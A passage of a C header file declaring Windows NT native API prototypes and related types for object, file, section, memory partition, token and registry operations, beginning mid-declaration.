    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor);

NTSTATUS NTAPI NtQuerySecurityObject(
    _In_ HANDLE Handle,
    _In_ SECURITY_INFORMATION SecurityInformation,
    _Out_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ ULONG Length,
    _Out_ PULONG LengthNeeded);

NTSTATUS NTAPI NtCompareObjects(
    _In_ HANDLE FirstObjectHandle,
    _In_ HANDLE SecondObjectHandle);

NTSTATUS NTAPI NtQueryObject(
    _In_opt_ HANDLE Handle,
    _In_ OBJECT_INFORMATION_CLASS ObjectInformationClass,
    _Out_opt_ PVOID ObjectInformation,
    _In_ ULONG ObjectInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI NtSetInformationObject(
    _In_ HANDLE Handle,
    _In_ OBJECT_INFORMATION_CLASS ObjectInformationClass,
    _In_reads_bytes_(ObjectInformationLength) PVOID ObjectInformation,
    _In_ ULONG ObjectInformationLength);

typedef enum _WAIT_TYPE {
    WaitAll,
    WaitAny,
    WaitNotification
} WAIT_TYPE;

NTSTATUS NTAPI NtWaitForSingleObject(
    _In_ HANDLE Handle,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout);

NTSTATUS NTAPI NtWaitForMultipleObjects(
    _In_ ULONG Count,
    _In_reads_(Count) HANDLE Handles[],
    _In_ WAIT_TYPE WaitType,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout);

/************************************************************************************
*
* Directory Object API.
*
************************************************************************************/

NTSTATUS NTAPI NtCreateDirectoryObject(
    _Out_ PHANDLE DirectoryHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtCreateDirectoryObjectEx(
    _Out_ PHANDLE DirectoryHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ShadowDirectoryHandle,
    _In_ ULONG Flags);

NTSTATUS NTAPI NtOpenDirectoryObject(
    _Out_ PHANDLE DirectoryHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtQueryDirectoryObject(
    _In_ HANDLE DirectoryHandle,
    _Out_opt_ PVOID Buffer,
    _In_ ULONG Length,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_ BOOLEAN RestartScan,
    _Inout_ PULONG Context,
    _Out_opt_ PULONG ReturnLength);

/************************************************************************************
*
* Private Namespace API.
*
************************************************************************************/

NTSTATUS NTAPI NtCreatePrivateNamespace(
    _Out_ PHANDLE NamespaceHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PVOID BoundaryDescriptor);

NTSTATUS NTAPI NtOpenPrivateNamespace(
    _Out_ PHANDLE NamespaceHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PVOID BoundaryDescriptor);

NTSTATUS NTAPI NtDeletePrivateNamespace(
    _In_ HANDLE NamespaceHandle);

/************************************************************************************
*
* Symbolic Link API.
*
************************************************************************************/

NTSTATUS NTAPI NtCreateSymbolicLinkObject(
    _Out_ PHANDLE LinkHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PUNICODE_STRING LinkTarget);

NTSTATUS WINAPI NtOpenSymbolicLinkObject(
    _Out_ PHANDLE LinkHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtQuerySymbolicLinkObject(
    _In_ HANDLE LinkHandle,
    _Inout_ PUNICODE_STRING LinkTarget,
    _Out_opt_ PULONG  ReturnedLength);

/************************************************************************************
*
* File API (+Driver&HotPatch).
*
************************************************************************************/

NTSTATUS NTAPI NtCreateFile(
    _Out_ PHANDLE FileHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_opt_ PLARGE_INTEGER AllocationSize,
    _In_ ULONG FileAttributes,
    _In_ ULONG ShareAccess,
    _In_ ULONG CreateDisposition,
    _In_ ULONG CreateOptions,
    _In_opt_ PVOID EaBuffer,
    _In_ ULONG EaLength);

NTSTATUS NTAPI NtCreateNamedPipeFile(
    _Out_ PHANDLE FileHandle,
    _In_ ULONG DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG ShareAccess,
    _In_ ULONG CreateDisposition,
    _In_ ULONG CreateOptions,
    _In_ ULONG NamedPipeType,
    _In_ ULONG ReadMode,
    _In_ ULONG CompletionMode,
    _In_ ULONG MaximumInstances,
    _In_ ULONG InboundQuota,
    _In_ ULONG OutboundQuota,
    _In_opt_ PLARGE_INTEGER DefaultTimeout);

NTSTATUS NTAPI NtCreateMailslotFile(
    _Out_ PHANDLE FileHandle,
    _In_ ULONG DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG CreateOptions,
    _In_ ULONG MailslotQuota,
    _In_ ULONG MaximumMessageSize,
    _In_ PLARGE_INTEGER ReadTimeout);

NTSTATUS NTAPI NtCreatePagingFile(
    _In_ PUNICODE_STRING PageFileName,
    _In_ PLARGE_INTEGER MinimumSize,
    _In_ PLARGE_INTEGER MaximumSize,
    _In_ ULONG Priority);

NTSTATUS NTAPI NtDeviceIoControlFile(
    _In_ HANDLE FileHandle,
    _In_ HANDLE Event,
    _In_ PIO_APC_ROUTINE  ApcRoutine,
    _In_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_ PVOID OutputBuffer,
    _In_ ULONG OutputBufferLength);

NTSTATUS NTAPI NtFsControlFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG FsControlCode,
    _In_opt_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_opt_ PVOID OutputBuffer,
    _In_ ULONG OutputBufferLength);

NTSTATUS NTAPI NtOpenFile(
    _Out_ PHANDLE FileHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG ShareAccess,
    _In_ ULONG OpenOptions);

NTSTATUS NTAPI NtReadFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_ PVOID Buffer,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key);

NTSTATUS NTAPI NtWriteFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PVOID Buffer,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key);

NTSTATUS NTAPI NtLockFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PLARGE_INTEGER ByteOffset,
    _In_ PLARGE_INTEGER Length,
    _In_ ULONG Key,
    _In_ BOOLEAN FailImmediately,
    _In_ BOOLEAN ExclusiveLock);

NTSTATUS NTAPI NtUnlockFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PLARGE_INTEGER ByteOffset,
    _In_ PLARGE_INTEGER Length,
    _In_ ULONG Key);

NTSTATUS NTAPI NtFlushBuffersFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock);

NTSTATUS NTAPI NtSetInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass);

NTSTATUS NTAPI NtDeleteFile(
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtQueryInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_ PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass);

NTSTATUS NTAPI NtQueryFullAttributesFile(
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PFILE_NETWORK_OPEN_INFORMATION FileInformation);

NTSTATUS NTAPI NtQueryDirectoryFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_ PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_opt_ PUNICODE_STRING FileName,
    _In_ BOOLEAN RestartScan);

NTSTATUS NTAPI NtQueryEaFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_opt_bytecount_(EaListLength) PVOID EaList,
    _In_ ULONG EaListLength,
    _In_opt_ PULONG EaIndex,
    _In_ BOOLEAN RestartScan);

NTSTATUS NTAPI NtSetEaFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_bytecount_(Length) PVOID Buffer,
    _In_ ULONG Length);

NTSTATUS NTAPI NtQueryVolumeInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_ PVOID FsInformation,
    _In_ ULONG Length,
    _In_ FS_INFORMATION_CLASS FsInformationClass);

NTSTATUS NTAPI NtQueryQuotaInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_reads_bytes_opt_(SidListLength) PVOID SidList,
    _In_ ULONG SidListLength,
    _In_opt_ PSID StartSid,
    _In_ BOOLEAN RestartScan);

NTSTATUS NTAPI NtSetQuotaInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_reads_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length);

NTSTATUS NTAPI NtReadFileScatter(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PFILE_SEGMENT_ELEMENT SegmentArray,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key);

NTSTATUS NTAPI NtWriteFileGather(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PFILE_SEGMENT_ELEMENT SegmentArray,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key);

NTSTATUS NTAPI NtQueryDirectoryFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_ PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_opt_ PUNICODE_STRING FileName,
    _In_ BOOLEAN RestartScan);

NTSTATUS NTAPI NtNotifyChangeDirectoryFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_ ULONG CompletionFilter,
    _In_ BOOLEAN WatchTree);

NTSTATUS NTAPI NtLoadDriver(
    _In_ PUNICODE_STRING DriverServiceName);

NTSTATUS NTAPI NtUnloadDriver(
    _In_ PUNICODE_STRING DriverServiceName);

NTSTATUS NTAPI NtLoadHotPatch(
    _In_ PUNICODE_STRING HotPatchName,
    _Reserved_ ULONG LoadFlag);

/************************************************************************************
*
* Section API (+MemoryPartitions).
*
************************************************************************************/

typedef enum _MEMORY_PARTITION_INFORMATION_CLASS {
    SystemMemoryPartitionInformation,
    SystemMemoryPartitionMoveMemory,
    SystemMemoryPartitionAddPagefile,
    SystemMemoryPartitionCombineMemory,
    SystemMemoryPartitionInitialAddMemory,
    SystemMemoryPartitionGetMemoryEvents,
    SystemMemoryPartitionMax
} MEMORY_PARTITION_INFORMATION_CLASS;

typedef struct _MEMORY_PARTITION_PAGE_RANGE {
    ULONG_PTR StartPage;
    ULONG_PTR NumberOfPages;
} MEMORY_PARTITION_PAGE_RANGE, *PMEMORY_PARTITION_PAGE_RANGE;

typedef struct _MEMORY_PARTITION_INITIAL_ADD_INFORMATION {
    ULONG Flags;
    ULONG NumberOfRanges;
    ULONG_PTR NumberOfPagesAdded;
    MEMORY_PARTITION_PAGE_RANGE PartitionRanges[1];
} MEMORY_PARTITION_INITIAL_ADD_INFORMATION, *PMEMORY_PARTITION_INITIAL_ADD_INFORMATION;

typedef struct _MEMORY_PARTITION_PAGE_COMBINE_INFORMATION {
    PVOID StopHandle;
    ULONG Flags;
    ULONG_PTR TotalNumberOfPages;
} MEMORY_PARTITION_PAGE_COMBINE_INFORMATION, *PMEMORY_PARTITION_PAGE_COMBINE_INFORMATION;

typedef struct _MEMORY_PARTITION_PAGEFILE_INFORMATION {
    UNICODE_STRING PageFileName;
    LARGE_INTEGER MinimumSize;
    LARGE_INTEGER MaximumSize;
    ULONG Flags;
} MEMORY_PARTITION_PAGEFILE_INFORMATION, *PMEMORY_PARTITION_PAGEFILE_INFORMATION;

typedef struct _MEMORY_PARTITION_TRANSFER_INFORMATION {
    ULONG_PTR NumberOfPages;
    ULONG NumaNode;
    ULONG Flags;
} MEMORY_PARTITION_TRANSFER_INFORMATION, *PMEMORY_PARTITION_TRANSFER_INFORMATION;

typedef struct _MEMORY_PARTITION_CONFIGURATION_INFORMATION {
    ULONG Flags;
    ULONG NumaNode;
    ULONG Channel;
    ULONG NumberOfNumaNodes;
    ULONG_PTR ResidentAvailablePages;
    ULONG_PTR CommittedPages;
    ULONG_PTR CommitLimit;
    ULONG_PTR PeakCommitment;
    ULONG_PTR TotalNumberOfPages;
    ULONG_PTR AvailablePages;
    ULONG_PTR ZeroPages;
    ULONG_PTR FreePages;
    ULONG_PTR StandbyPages;
} MEMORY_PARTITION_CONFIGURATION_INFORMATION, *PMEMORY_PARTITION_CONFIGURATION_INFORMATION;

NTSTATUS NTAPI NtCreateSection(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PLARGE_INTEGER MaximumSize,
    _In_ ULONG SectionPageProtection,
    _In_ ULONG AllocationAttributes,
    _In_opt_ HANDLE FileHandle);

NTSTATUS NTAPI NtOpenSection(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtMapViewOfSection(
    _In_ HANDLE SectionHandle,
    _In_ HANDLE ProcessHandle,
    _Inout_	PVOID *BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _In_ SIZE_T CommitSize,
    _Inout_opt_ PLARGE_INTEGER SectionOffset,
    _Inout_ PSIZE_T ViewSize,
    _In_ SECTION_INHERIT InheritDisposition,
    _In_ ULONG AllocationType,
    _In_ ULONG Win32Protect);

NTSTATUS NTAPI NtQuerySection(
    _In_ HANDLE SectionHandle,
    _In_ SECTION_INFORMATION_CLASS SectionInformationClass,
    _Out_ PVOID SectionInformation,
    _In_ SIZE_T SectionInformationLength,
    _Out_opt_ PSIZE_T ReturnLength);

NTSTATUS NTAPI NtUnmapViewOfSection(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID BaseAddress);

NTSTATUS NTAPI NtUnmapViewOfSectionEx(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ ULONG Flags);

NTSTATUS NTAPI NtExtendSection(
    _In_ HANDLE SectionHandle,
    _Inout_ PLARGE_INTEGER NewSectionSize);

NTSTATUS NTAPI NtMapUserPhysicalPages(
    _In_ PVOID VirtualAddress,
    _In_ ULONG_PTR NumberOfPages,
    _In_reads_opt_(NumberOfPages) PULONG_PTR UserPfnArray);

NTSTATUS NTAPI NtMapUserPhysicalPagesScatter(
    _In_reads_(NumberOfPages) PVOID *VirtualAddresses,
    _In_ ULONG_PTR NumberOfPages,
    _In_reads_opt_(NumberOfPages) PULONG_PTR UserPfnArray);

NTSTATUS NTAPI NtAllocateUserPhysicalPages(
    _In_ HANDLE ProcessHandle,
    _Inout_ PULONG_PTR NumberOfPages,
    _Out_writes_(*NumberOfPages) PULONG_PTR UserPfnArray);

NTSTATUS NTAPI NtFreeUserPhysicalPages(
    _In_ HANDLE ProcessHandle,
    _Inout_ PULONG_PTR NumberOfPages,
    _In_reads_(*NumberOfPages) PULONG_PTR UserPfnArray);

NTSTATUS NTAPI NtOpenPartition(
    _Out_ PHANDLE PartitionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtManagePartition(
    _In_ HANDLE TargetHandle,
    _In_opt_ HANDLE SourceHandle,
    _In_ MEMORY_PARTITION_INFORMATION_CLASS PartitionInformationClass,
    _In_ PVOID PartitionInformation,
    _In_ ULONG PartitionInformationLength);

NTSTATUS NTAPI NtCreatePartition(
    _Out_ PHANDLE PartitionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG PreferredNode);

/************************************************************************************
*
* Token API.
*
************************************************************************************/

NTSTATUS NTAPI NtAccessCheck(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ HANDLE ClientToken,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ PGENERIC_MAPPING GenericMapping,
    _Out_writes_bytes_(*PrivilegeSetLength) PPRIVILEGE_SET PrivilegeSet,
    _Inout_ PULONG PrivilegeSetLength,
    _Out_ PACCESS_MASK GrantedAccess,
    _Out_ PNTSTATUS AccessStatus);

NTSTATUS NTAPI NtOpenProcessToken(
    _In_ HANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE TokenHandle);

NTSTATUS NTAPI NtOpenProcessTokenEx(
    _In_ HANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _Out_ PHANDLE TokenHandle);

NTSTATUS NTAPI NtDuplicateToken(
    _In_ HANDLE ExistingTokenHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ BOOLEAN EffectiveOnly,
    _In_ TOKEN_TYPE TokenType,
    _Out_ PHANDLE NewTokenHandle);

#define DISABLE_MAX_PRIVILEGE   0x1 // winnt
#define SANDBOX_INERT           0x2 // winnt
#define LUA_TOKEN               0x4
#define WRITE_RESTRICT          0x8

NTSTATUS NTAPI NtFilterToken(
    _In_ HANDLE ExistingTokenHandle,
    _In_ ULONG Flags,
    _In_opt_ PTOKEN_GROUPS SidsToDisable,
    _In_opt_ PTOKEN_PRIVILEGES PrivilegesToDelete,
    _In_opt_ PTOKEN_GROUPS RestrictedSids,
    _Out_ PHANDLE NewTokenHandle);

NTSTATUS NTAPI NtImpersonateAnonymousToken(
    _In_ HANDLE ThreadHandle);

NTSTATUS NTAPI NtQueryInformationToken(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _Out_ PVOID TokenInformation,
    _In_ ULONG TokenInformationLength,
    _Out_ PULONG ReturnLength);

NTSTATUS NTAPI NtSetInformationToken(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _In_ PVOID TokenInformation,
    _In_ ULONG TokenInformationLength);

NTSTATUS NTAPI NtOpenThreadToken(
    _In_ HANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ BOOLEAN OpenAsSelf,
    _Out_ PHANDLE TokenHandle);

NTSTATUS NTAPI NtOpenThreadTokenEx(
    _In_ HANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ BOOLEAN OpenAsSelf,
    _In_ ULONG HandleAttributes,
    _Out_ PHANDLE TokenHandle);

NTSTATUS NTAPI NtAdjustPrivilegesToken(
    _In_ HANDLE TokenHandle,
    _In_ BOOLEAN DisableAllPrivileges,
    _In_opt_ PTOKEN_PRIVILEGES NewState,
    _In_opt_ ULONG BufferLength,
    _Out_opt_ PTOKEN_PRIVILEGES PreviousState,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI NtAdjustGroupsToken(
    _In_ HANDLE TokenHandle,
    _In_ BOOLEAN ResetToDefault,
    _In_opt_ PTOKEN_GROUPS NewState,
    _In_opt_ ULONG BufferLength,
    _Out_writes_bytes_to_opt_(BufferLength, *ReturnLength) PTOKEN_GROUPS PreviousState,
    _Out_ PULONG ReturnLength);

NTSTATUS NTAPI NtQueryInformationToken(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _Out_ PVOID TokenInformation,
    _In_ ULONG TokenInformationLength,
    _Out_ PULONG ReturnLength);

NTSTATUS NTAPI NtCompareTokens(
    _In_ HANDLE FirstTokenHandle,
    _In_ HANDLE SecondTokenHandle,
    _Out_ PBOOLEAN Equal);

NTSTATUS NTAPI NtPrivilegeCheck(
    _In_ HANDLE ClientToken,
    _Inout_ PPRIVILEGE_SET RequiredPrivileges,
    _Out_ PBOOLEAN Result);

NTSTATUS NTAPI NtCreateToken(
    _Out_ PHANDLE TokenHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ TOKEN_TYPE TokenType,
    _In_ PLUID AuthenticationId,
    _In_ PLARGE_INTEGER ExpirationTime,
    _In_ PTOKEN_USER User,
    _In_ PTOKEN_GROUPS Groups,
    _In_ PTOKEN_PRIVILEGES Privileges,
    _In_opt_ PTOKEN_OWNER Owner,
    _In_ PTOKEN_PRIMARY_GROUP PrimaryGroup,
    _In_opt_ PTOKEN_DEFAULT_DACL DefaultDacl,
    _In_ PTOKEN_SOURCE TokenSource);

NTSTATUS NTAPI NtCreateTokenEx(
    _Out_ PHANDLE TokenHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ TOKEN_TYPE TokenType,
    _In_ PLUID AuthenticationId,
    _In_ PLARGE_INTEGER ExpirationTime,
    _In_ PTOKEN_USER User,
    _In_ PTOKEN_GROUPS Groups,
    _In_ PTOKEN_PRIVILEGES Privileges,
    _In_opt_ PVOID UserAttributes, // points to TOKEN_SECURITY_ATTRIBUTES_INFORMATION
    _In_opt_ PVOID DeviceAttributes, // points to PTOKEN_SECURITY_ATTRIBUTES_INFORMATION
    _In_opt_ PTOKEN_GROUPS DeviceGroups,
    _In_opt_ PTOKEN_MANDATORY_POLICY TokenMandatoryPolicy,
    _In_opt_ PTOKEN_OWNER Owner,
    _In_ PTOKEN_PRIMARY_GROUP PrimaryGroup,
    _In_opt_ PTOKEN_DEFAULT_DACL DefaultDacl,
    _In_ PTOKEN_SOURCE TokenSource);

NTSTATUS NTAPI NtCreateLowBoxToken(
    _Out_ PHANDLE TokenHandle,
    _In_ HANDLE ExistingTokenHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PSID PackageSid,
    _In_ ULONG CapabilityCount,
    _In_reads_opt_(CapabilityCount) PSID_AND_ATTRIBUTES Capabilities,
    _In_ ULONG HandleCount,
    _In_reads_opt_(HandleCount) HANDLE *Handles);

/************************************************************************************
*
* Registry API.
*
************************************************************************************/

NTSTATUS NTAPI NtCreateKey(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Reserved_ ULONG TitleIndex,
    _In_opt_ PUNICODE_STRING Class,
    _In_ ULONG CreateOptions,
    _Out_opt_ PULONG Disposition);

NTSTATUS NTAPI NtCreateKeyTransacted(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Reserved_ ULONG TitleIndex,
    _In_opt_ PUNICODE_STRING Class,
    _In_ ULONG CreateOptions,
    _In_ HANDLE TransactionHandle,
    _Out_opt_ PULONG Disposition);

NTSTATUS NTAPI NtOpenKey(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtOpenKeyEx(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG OpenOptions);

NTSTATUS NTAPI NtOpenKeyTransacted(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE TransactionHandle);

NTSTATUS NTAPI NtOpenKeyTransactedEx(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG OpenOptions,
    _In_ HANDLE TransactionHandle);

NTSTATUS NTAPI NtQueryKey(
    _In_ HANDLE KeyHandle,
    _In_ KEY_INFORMATION_CLASS KeyInformationClass,
    _Out_opt_ PVOID KeyInformation,
    _In_ ULONG Length,
    _Out_ PULONG ResultLength);

NTSTATUS NTAPI NtEnumerateKey(
    _In_ HANDLE KeyHandle,
    _In_ ULONG Index,
    _In_ KEY_INFORMATION_CLASS KeyInformationClass,
    _Out_opt_ PVOID KeyInformation,
    _In_ ULONG Length,
    _Out_ PULONG ResultLength);

NTSTATUS NTAPI NtEnumerateValueKey(
    _In_ HANDLE KeyHandle,
    _In_ ULONG Index,
    _In_ KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    _Out_writes_bytes_opt_(Length) PVOID KeyValueInformation,
    _In_ ULONG Length,
    _Out_ PULONG ResultLength);

NTSTATUS NTAPI NtQueryValueKey(
    _In_ HANDLE KeyHandle,
    _In_ PUNICODE_STRING ValueName,
    _In_ KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    _Out_ PVOID KeyValueInformation,
    _In_ ULONG Length,
    _Out_ PULONG ResultLength);

NTSTATUS NTAPI NtQueryMultipleValueKey(
    _In_ HANDLE KeyHandle,
    _Inout_updates_(EntryCount) PKEY_VALUE_ENTRY ValueEntries,
    _In_ ULONG EntryCount,
    _Out_writes_bytes_(*BufferLength) PVOID ValueBuffer,
    _Inout_ PULONG BufferLength,
    _Out_opt_ PULONG RequiredBufferLength);

NTSTATUS NTAPI NtSetValueKey(
    _In_ HANDLE KeyHandle,
    _In_ PUNICODE_STRING ValueName,
    _In_opt_ ULONG TitleIndex,
    _In_ ULONG Type,
    _In_ PVOID Data,
    _In_ ULONG DataSize);

NTSTATUS NTAPI NtDeleteKey(
    _In_ HANDLE KeyHandle);

NTSTATUS NTAPI NtDeleteValueKey(
    _In_ HANDLE KeyHandle,
    _In_ PUNICODE_STRING ValueName);

NTSTATUS NTAPI NtRenameKey(
    _In_ HANDLE KeyHandle,
    _In_ PUNICODE_STRING NewName);

NTSTATUS NTAPI NtSetInformationKey(
    _In_ HANDLE KeyHandle,
    _In_ KEY_SET_INFORMATION_CLASS KeySetInformationClass,
    _In_reads_bytes_(KeySetInformationLength) PVOID KeySetInformation,
    _In_ ULONG KeySetInformationLength);

NTSTATUS NTAPI NtFlushKey(
    _In_ HANDLE KeyHandle);

NTSTATUS NTAPI NtCompressKey(
    _In_ HANDLE Key);

